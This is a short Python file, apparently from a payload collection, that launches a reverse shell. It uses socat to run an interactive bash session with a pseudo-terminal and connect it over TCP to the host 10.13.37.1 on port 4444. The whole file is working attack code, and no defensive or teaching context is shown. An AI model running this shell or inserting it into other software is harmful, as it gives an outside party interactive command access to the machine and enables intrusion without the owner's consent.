# File: payloads/network/reverse_shell_tunnel.py
import subprocess

print("[*] Launching reverse shell via socat to remote host")
subprocess.run([
    "socat",
    "exec:'bash -li',pty,stderr,setsid,sigint,sane",
    "tcp:10.13.37.1:4444"
])

